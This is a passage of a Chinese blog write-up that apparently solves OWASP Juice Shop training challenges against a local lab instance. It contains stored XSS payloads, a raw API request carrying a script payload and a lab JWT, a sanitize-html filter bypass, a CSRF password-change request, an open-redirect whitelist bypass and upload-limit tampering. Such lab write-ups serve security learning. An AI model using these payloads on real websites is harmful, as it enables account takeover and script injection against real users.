+<h2 id="Retrieve-Blueprint"><a href="#Retrieve-Blueprint" class="headerlink" title="Retrieve Blueprint"></a>Retrieve Blueprint</h2><p>下载一个想设计文件通过3d打印去打。<br>先下载一张图片。通过图片可知相机制造商为openscad，谷歌可知这个软件编辑的3d打印的格式为.stl，暴力破解<a href="http://192.168.239.128:3000/public/images/products/" target="_blank" rel="noopener">http://192.168.239.128:3000/public/images/products/</a>  该目录下爆破.stl。看源码也知道有个JuiceShop.stl文件。</p>
+<h2 id="Typosquatting-Tier-1"><a href="#Typosquatting-Tier-1" class="headerlink" title="Typosquatting Tier 1"></a>Typosquatting Tier 1</h2><p>在ftp下载package.json.bak 文件并打开，找到epilogue-js吗，百度去搜一下原因。在联系我们的页面上，提交<code>epilogue-js</code>的评论</p>
+<h2 id="Upload-Size"><a href="#Upload-Size" class="headerlink" title="Upload Size"></a>Upload Size</h2><p>在投诉那里先上传一个小于100kb的.pdf文件， 通过bp抓包，修改为大于100kb小于200kb的。就ok</p>
+<h2 id="Upload-Type"><a href="#Upload-Type" class="headerlink" title="Upload Type"></a>Upload Type</h2><p>修改一下上一题的后缀名即可</p>
+<h2 id="User-Credentials"><a href="#User-Credentials" class="headerlink" title="User Credentials"></a>User Credentials</h2><p>根据登入处的报错知道有 id,user,email字段<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"error"</span>:&#123;<span class="string">"message"</span>:<span class="string">"SQLITE_ERROR: near \"c4ca4238a0b923820dcc509a6f75849b\": syntax error"</span>,<span class="string">"stack"</span>:<span class="string">"SequelizeDatabaseError: SQLITE_ERROR: near \"c4ca4238a0b923820dcc509a6f75849b\": syntax error\n at Query.formatError (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:423:16)\n at afterExecute (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:119:32)\n at replacement (/juice-shop/node_modules/sqlite3/lib/trace.js:19:31)\n at Statement.errBack (/juice-shop/node_modules/sqlite3/lib/sqlite3.js:16:21)"</span>,<span class="string">"name"</span>:<span class="string">"SequelizeDatabaseError"</span>,<span class="string">"parent"</span>:&#123;<span class="string">"errno"</span>:1,<span class="string">"code"</span>:<span class="string">"SQLITE_ERROR"</span>,<span class="string">"sql"</span>:<span class="string">"SELECT * FROM Users WHERE email = ''' AND password = 'c4ca4238a0b923820dcc509a6f75849b'"</span>&#125;,<span class="string">"original"</span>:&#123;<span class="string">"errno"</span>:1,<span class="string">"code"</span>:<span class="string">"SQLITE_ERROR"</span>,<span class="string">"sql"</span>:<span class="string">"SELECT * FROM Users WHERE email = ''' AND password = 'c4ca4238a0b923820dcc509a6f75849b'"</span>&#125;,<span class="string">"sql"</span>:<span class="string">"SELECT * FROM Users WHERE email = ''' AND password = 'c4ca4238a0b923820dcc509a6f75849b'"</span>&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>在 <code>Christmas Special</code>这题上已经有过分析，要</p>
+<h2 id="Vulnerable-Library"><a href="#Vulnerable-Library" class="headerlink" title="Vulnerable Library"></a>Vulnerable Library</h2><h2 id="XSS-Tier-2"><a href="#XSS-Tier-2" class="headerlink" title="XSS Tier 2"></a>XSS Tier 2</h2><p>实现存储行xss就要插入数据库，一开始在联系我们的评论界面上提交xss语句，进入后台查看，发现评论为空，全被过滤了，只好另寻他法。最后想到在注册用户那里，注册一个账户，页面上有js判断，不能直接插入，只好bp转包，将用户名改为 <code>&lt;script&gt;alert(&quot;XSS2&quot;)&lt;/script&gt;</code> ，返回数据包失败，从返回的消息，知道将双引号，加了反斜杠，最后构造<code>&lt;script&gt;alert(\&quot;XSS\&quot;)&lt;/script&gt;</code>,返回包成功，再访问<code>administration</code>页面，弹框成功。</p>
+<h2 id="XSS-Tier-3"><a href="#XSS-Tier-3" class="headerlink" title="XSS Tier 3"></a>XSS Tier 3</h2><p>根本不使用前端应用程序执行持续的XSS攻击。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /api/Products HTTP/1.1</span><br><span class="line">Host: 192.168.20.132:3000</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6NywiZW1haWwiOiI0MzE3NzQ0MzdAcXEuY29tIiwicGFzc3dvcmQiOiI4ZWVkOWVkN2JjN2UxOGE4OTc1Y2E1YTM5MWUzMmEwYyIsImNyZWF0ZWRBdCI6IjIwMTgtMDMtMTQgMDQ6MDA6NDcuMjMwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMTgtMDMtMTQgMDQ6MDA6NDcuMjMwICswMDowMCJ9LCJpYXQiOjE1MjEwMzEwNjEsImV4cCI6MTUyMTA0OTA2MX0.VZz6FISGX8_U6FuaAl8e89cxhZtFX9sFRb-Dk17pvaMfNQB3_TloX5H-sS1pCqaxSfr3EYD6tQUkcKSpqNkIuurY6uGp8AATYJ-vYFDd-yoeSQZONda8KlufopMGSuWjsKO08XbxbcRNSqJw0Eb6hoWmaiIHQkgIskYBGTUnxqo</span><br><span class="line">Content-Length: 82</span><br><span class="line">Cookie: continueCode=QbNz3wepgLV0eBH4urh8tnc8IqT1iBf7uKtwIbT7ibuEI7f9ZABKn9jYlaxZ; io=QvKEDdlKHoHGbeCDAABM; email=431774437%40qq.com; token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6NywiZW1haWwiOiI0MzE3NzQ0MzdAcXEuY29tIiwicGFzc3dvcmQiOiI4ZWVkOWVkN2JjN2UxOGE4OTc1Y2E1YTM5MWUzMmEwYyIsImNyZWF0ZWRBdCI6IjIwMTgtMDMtMTQgMDQ6MDA6NDcuMjMwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMTgtMDMtMTQgMDQ6MDA6NDcuMjMwICswMDowMCJ9LCJpYXQiOjE1MjEwMzEwNjEsImV4cCI6MTUyMTA0OTA2MX0.VZz6FISGX8_U6FuaAl8e89cxhZtFX9sFRb-Dk17pvaMfNQB3_TloX5H-sS1pCqaxSfr3EYD6tQUkcKSpqNkIuurY6uGp8AATYJ-vYFDd-yoeSQZONda8KlufopMGSuWjsKO08XbxbcRNSqJw0Eb6hoWmaiIHQkgIskYBGTUnxqo</span><br><span class="line">X-Forwarded-For: 127.0.0.1, 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Reque</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">"name"</span>: <span class="string">"XSS3"</span>, <span class="string">"description"</span>: <span class="string">"&lt;script&gt;alert(\"XSS\")&lt;/script&gt;"</span>, <span class="string">"price"</span>: 47.11&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="XXE-Tier-1"><a href="#XXE-Tier-1" class="headerlink" title="XXE Tier 1"></a>XXE Tier 1</h2><h1 id="四颗星"><a href="#四颗星" class="headerlink" title="四颗星"></a>四颗星</h1><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>万能密码登入 ，通过bp抓包，可删除现有的current的，即可。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /rest/user/change-password?current=4567\89\76&amp;new=123456&amp;repeat=123456</span><br></pre></td></tr></table></figure></p>
+<h2 id="Easter-Egg-Tier-2"><a href="#Easter-Egg-Tier-2" class="headerlink" title="Easter Egg Tier 2"></a>Easter Egg Tier 2</h2><h2 id="JWT-Issues-Tier-1"><a href="#JWT-Issues-Tier-1" class="headerlink" title="JWT Issues Tier 1"></a>JWT Issues Tier 1</h2><h2 id="Login-CISO"><a href="#Login-CISO" class="headerlink" title="Login CISO"></a>Login CISO</h2><h2 id="Redirects-Tier-2"><a href="#Redirects-Tier-2" class="headerlink" title="Redirects Tier 2"></a>Redirects Tier 2</h2><p>在<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.20.132:3000/ redirect？to = https：//github.com/bkimminich/juice-shop。</span><br></pre></td></tr></table></figure></p>
+<p>有个重定向。<br>尝试重定向到一些无法识别的URL会因白名单验证而失败406 Error: Unrecognized target URL for redirect。<br>卸下to参数（HTTP：//本地主机：3000 /重定向）将转而产生500 TypeError: Cannot read property ‘indexOf’ of undefined，其中indexOf表示在这样的白名单中的作品严重的缺陷。<br>制作重定向网址，以便目标网址to带有包含白名单网址的自己的参数，例如<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.20.132:3000/redirect?to=http://www.baidu.com?pwned=https://github.com/bkimminich/juice-shop</span><br></pre></td></tr></table></figure></p>
+<p>通过忘记密码机制重置本德的密码</p>
+<h2 id="Reset-Bjoern’s-Password"><a href="#Reset-Bjoern’s-Password" class="headerlink" title="Reset Bjoern’s Password"></a>Reset Bjoern’s Password</h2><h2 id="Typosquatting-Tier-2"><a href="#Typosquatting-Tier-2" class="headerlink" title="Typosquatting Tier 2"></a>Typosquatting Tier 2</h2><h2 id="XSS-Tier-4"><a href="#XSS-Tier-4" class="headerlink" title="XSS Tier 4"></a>XSS Tier 4</h2><p>里就利用sanitize-html这个版本的漏洞，编号为CVE-2016-1000237，用google搜索。根据该版本的特征通过不递归绕过验证。在评论处，构造语句&lt;<script>4</script>script&gt;alert(“XSS”)&lt;/script&gt;</p>
+<h2 id="XXE-Tier-2"><a href="#XXE-Tier-2" class="headerlink" title="XXE Tier 2"></a>XXE Tier 2</h2><p>感觉挺无聊的，等以后有空再玩。<br><br>参考文章<br><br><a href="https://github.com/bkimminich/pwning-juice-shop/blob/master/appendix/solutions.md" target="_blank" rel="noopener">https://github.com/bkimminich/pwning-juice-shop/blob/master/appendix/solutions.md</a></p>
+
+                
+<p class="pink-link-context">
+    <a href="/posts/8a554d22.html" rel="next" title="审计以及漏洞知识点小整理">
+    Prev: 审计以及漏洞知识点小整理
+  </a>
+</p>
+
+
+
+<p class="pink-link-context">
+    <a href="/posts/523c96b0.html" rel="next" title="webug 靶场">
+    Next: webug 靶场
+  </a>
+</p>
+
+
+            </div>
+			
+        </div>
+    </div>
+</article>
+
+
+    <script src="../../js/av-min.js"></script>
+    <script src='../../js/Valine.min.js'></script>
+	<div style="background-color: #FFFFFF">
+    <div id="vcomments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments' ,
+			appId: 'ul15fj2BGxFoWtoSlntkMlMf-gzGzoHsz',
+			appKey: 'vvdd3JD38t8gwf4ytlq3ON3H',
+			notify: false, 
+			verify: false, 
+			avatar: 'wavatar', 
+			placeholder: 'ε = = (づ′▽`)づ '
+        })
+    </script>
+  </div>
+
+</div>
+
+		 
+		 
+        <div class="fixed-action-btn float-sitemap">
+    <a class="btn-floating btn-large pink">
+      <i class="fa fa-caret-square-o-up"></i>
+    </a>
+    <ul>
+      <li><a class="btn-return-top btn-floating waves-effect green" title="Return to top"><i class="fa fa-arrow-circle-o-up"></i></a></li>
+      <li><a class="btn-floating waves-effect button-collapse yellow darken-1"  data-activates="main-menu" title="Menu"><i class="fa fa-navicon"></i></a></li>
+    </ul>
+  </div>
+
+    </main>
+    <footer class="page-footer indigo darken-1">
+    
+    <div class="footer-container container">
+        <div class="row">
+            
+            <div class="social-group col m4 s12">
+                <h5 class="white-text">Social</h5>
+                
+                    <a class="social-link" href="#" target="_blank">
+                        <i class="fa fa-2x fa-weibo"></i>
+                    </a>
+                
+                    <a class="social-link" href="#" target="_blank">
+                        <i class="fa fa-2x fa-github"></i>
+                    </a>
+                
+                    <a class="social-link" href="/atom.xml" target="_blank">
+                        <i class="fa fa-2x fa-rss"></i>
+                    </a>
+                
+                
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <div class="site-visitors-container white-text">
+        <span>
+            <i class="fa fa-user"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+        </span>
+        <span>&nbsp;|&nbsp;</span>
+        <span>
+            <i class="fa fa-eye"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+
+
+            </div>
+            
+
+            
+            <div class="col m8 s12">
+                <h5 class="white-text">Links</h5>
+                
+                    <a class="social-link" href="https://blog.csdn.net/Wuzebiao2016" target="_blank">wuzebiao</a>
+                
+                    <a class="social-link" href="http://www.ifuryst.com/" target="_blank">iFurySt</a>
+                
+                    <a class="social-link" href="http://daikersec.com/" target="_blank">daiker</a>
+                
+                    <a class="social-link" href="http://blog.dedsec.club" target="_blank">dedsec</a>
+                
+                    <a class="social-link" href="https://www.leavesongs.com/" target="_blank">离别歌</a>
+                
+                    <a class="social-link" href="https://www.sec-wiki.com/" target="_blank">Secwiki</a>
+                
+                    <a class="social-link" href="https://zhuanlan.kanxue.com/" target="_blank">看雪专栏</a>
+                
+                    <a class="social-link" href="http://www.itxueke.com/SecNavi/#3782" target="_blank">IT学客安全导航</a>
+                
+                    <a class="social-link" href="http://www.freebuf.com/" target="_blank">安全客</a>
+                
+                    <a class="social-link" href="https://yq.aliyun.com/articles/?spm=a2c4e.11155573.minheadermenu.3.6cd475c6d2FQvQ" target="_blank">云栖社区</a>
+                
+                    <a class="social-link" href="https://paper.seebug.org/" target="_blank">知道创宇</a>
+                
+                    <a class="social-link" href="https://www.waitalone.cn/pentest" target="_blank">独自等待</a>
+                
+                    <a class="social-link" href="https://3gstudent.github.io/3gstudent.github.io/" target="_blank">三好学生</a>
+                
+                    <a class="social-link" href="http://paper.tuisec.win/index.jsp" target="_blank">先知社区文章</a>
+                
+            </div>
+            
+        </div>
+    </div>
+    
+
+    <div class="footer-copyright pink-link-context">
+        <div class="container">
+            © 2016 example.com, All rights reserved.
+            <p class="right" style="margin-top: 0;">Blog powered by <a href="https://hexo.io">Hexo</a> | Theme <a href="https://github.com/raytaylorlin/hexo-theme-raytaylorism">raytaylorism</a></p>
+        </div>
+    </div>
+</footer>
+
+
+    <noscript>
+    <div class="noscript">
+        <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+    </div>
+</noscript>
+<div class="noscript">
+    <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+</div>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/materialize.min.js"></script>
+
+<script>
+    (function($) {
+        $(document).ready(function() {
+            // 隐藏禁用javascript（针对微信内置浏览器）的提示
+            $('.noscript').hide();
+
+            // 图片缩放效果
+            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');
+
+            // 给图片加上点击放大效果（materialbox插件）
+            $imgs.addClass('materialboxed').each(function(i, el) {
+                $(this).attr('data-caption', $(this).attr('alt') || ' ');
+            }).materialbox();
+
+            // 优化表格的显示
+            $('table').each(function() {
+                var $table = $(this);
+                // 除去多行代码的情况
+                if ($table.find('pre').length == 0) {
+                    $table.addClass('responsive-table striped bordered');
+                }
+            });
+
+            // 首页幻灯片
+            $('.slider').slider({indicators: true, full_width: true, interval: 8000});
+
+            $(".button-collapse").sideNav();
+            $(".category-menu").sideNav();
+
+            // 针对gallery post
+            $('.carousel').carousel({full_width: true});
+            $('.carousel-control.prev').click(function() {
+                $('.carousel').carousel('prev');
+            });
+            $('.carousel-control.next').click(function() {
+                $('.carousel').carousel('next');
+            });
+
+            // 文章目录
+            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();
+
+            // 目录随屏幕滚动（防止目录过长越过footer）
+            var $toc = $('.toc');
+            var scrollTargetTop = 0;
+            $(window).scroll(function() {
+                var $activeLink = $toc.find('a.active.section');
+                if ($(window).scrollTop() < 100) {
+                    scrollTargetTop = 0;
+                } else {
+                    if ($activeLink[0]) {
+                        scrollTargetTop = $activeLink.offset().top - $toc.offset().top;
+                    }
+                }
+                $toc.css('top', '-' + scrollTargetTop + 'px');
+            });
+
+            // 修正文章目录的left-border颜色
+            var color = $('.table-of-contents-text').css('color');
+            $('.table-of-contents-link').css('border-left-color', color);
+
+            // 针对移动端做的优化：FAB按钮点击一下收回
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                $('.fixed-action-btn').addClass('click-to-toggle');
+            }
+            // 回到顶部
+            $('.btn-return-top').click(function() {
+                $('body, html').animate({
+                    scrollTop: 0
+                }, 500);
+            });
+
+            // 重置读书页面的Tab标签页的颜色
+            $('li.tab a').hover(function() {
+                $(this).toggleClass('text-lighten-4');
+            });
+            $('.indicator').addClass('pink lighten-2');
+
+            
+            // 添加new标签
+            $('menu-home, menu-archive, .menu-reading, .menu-about').append('<span class="new badge pink"></span>');
+            
+
+            // 搜索功能
+            $('.modal-trigger').leanModal({
+                // 打开搜索框时自动聚焦
+                ready: function() {
+                    if ($('#search').is(":visible")) {
+                        $('#search-input').focus();
+                    }
+                }
+            });
+            var searchXml = "search.xml";
+            if (searchXml.length == 0) {
+             	searchXml = "search.xml";
+            }
+            var searchPath = "/" + searchXml;
+            initSearch(searchPath, 'search-input', 'search-result');
+        });
+
+        // 初始化搜索与匹配函数
+        var initSearch = function(path, search_id, content_id) {
+            'use strict';
+            $.ajax({
+                url: path,
+                dataType: "xml",
+                success: function(xmlResponse) {
+                    // get the contents from search data
+                    var datas = $("entry", xmlResponse).map(function() {
+                        return {
+                            title: $("title", this).text(),
+                            content: $("content", this).text(),
+                            url: $("url", this).text()
+                        };
+                    }).get();
+                    var $input = document.getElementById(search_id);
+                    var $resultContent = document.getElementById(content_id);
+                    $input.addEventListener('input', function() {
+                        var str = '<ul class=\"search-result-list\">';
+                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                        $resultContent.innerHTML = "";
+                        if (this.value.trim().length <= 0) {
+                            return;
+                        }
+                        // perform local searching
+                        datas.forEach(function(data) {
+                            var isMatch = true;
+                            var content_index = [];
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty titles and contents
+                            if (data_title != '' && data_content != '') {
+                                keywords.forEach(function(keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            }
+                            // show search results
+                            if (isMatch) {
+                                keywords.forEach(function(keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    data_title = data_title.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                });
+
+                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 100 characters
+                                    var start = first_occur - 20;
+                                    var end = first_occur + 80;
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+                                    if (start == 0) {
+                                        end = 100;
+                                    }
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+                                    var match_content = content.substring(start, end);
+                                    // highlight all keywords
+                                    keywords.forEach(function(keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                    });
+
+                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        $resultContent.innerHTML = str;
+                    });
+                }
+            });
+        }
+    })(jQuery);
+</script>
+
+
+<script src="/js/prettify.js"></script>
+<script type="text/javascript">
+    $(document).ready(function() {
+        $("pre").addClass("prettyprint");
+        prettyPrint();
+    });
+</script>
+
+
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-124439084-1', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+});
+</script>
+<script type="text/javascript" async
+  src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+
+	
+<script>(function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/APP_ID.js","daovoice");</script>
+<script>
+  daovoice('init', {
+    app_id: "45fb937d",
+  });
+  daovoice('update');
+</script>	
+</body>
+</html>
